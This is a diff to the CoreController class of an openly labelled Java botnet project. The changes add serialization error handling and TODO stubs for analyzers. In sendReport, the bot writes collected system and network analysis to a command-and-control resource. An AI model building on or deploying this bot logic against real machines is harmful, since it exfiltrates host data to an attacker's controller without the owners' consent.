@@ -48,6 +48,7 @@ import com.acmutv.botnet.tool.runtime.RuntimeManager;
 import com.acmutv.botnet.tool.net.ConnectionManager;
 import com.acmutv.botnet.tool.time.Duration;
 import com.acmutv.botnet.tool.time.Interval;
+import com.fasterxml.jackson.core.JsonProcessingException;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
@@ -443,11 +444,16 @@ public class CoreController {
   private static void sendReport(Report report) throws BotExecutionException {
     final String logResource = CONTROLLER.getLogResource();
     LOGGER.info("Sending analysis to C&C at {}...", logResource);
-    final String json = report.toJson();
+    final String json;
+    try {
+      json = report.toJson();
+    } catch (JsonProcessingException exc) {
+      throw new BotExecutionException("Cannot serialize report. %s", exc.getMessage());
+    }
     try {
       IOManager.writeResource(logResource, json);
     } catch (IOException exc) {
-      throw new BotExecutionException("Cannot communicate with C&C at {}", logResource);
+      throw new BotExecutionException("Cannot communicate with C&C at %s", logResource);
     }
     LOGGER.info("Analysis sent to C&C at {}", logResource);
   }
@@ -462,14 +468,22 @@ public class CoreController {
 
     if (AppConfigurationService.getConfigurations().isSysInfo()) {
       Analyzer systemAnalyzer = new SystemAnalyzer();
-      //TODO configure system analyzer
+      //TODO configure system features analyzer
       ANALYZERS.add(systemAnalyzer);
     }
 
     if (AppConfigurationService.getConfigurations().isNetInfo()) {
       Analyzer networkAnalyzer = new NetworkAnalyzer();
-      //TODO configure network analyzer
+      //TODO configure network features analyzer
       ANALYZERS.add(networkAnalyzer);
+    }
+
+    if (AppConfigurationService.getConfigurations().isSysStat()) {
+      //TODO configure system statistics analyzer
+    }
+
+    if (AppConfigurationService.getConfigurations().isNetStat()) {
+      //TODO configure network statistics analyzer
     }
 
     LOGGER.trace("Resources allocated");
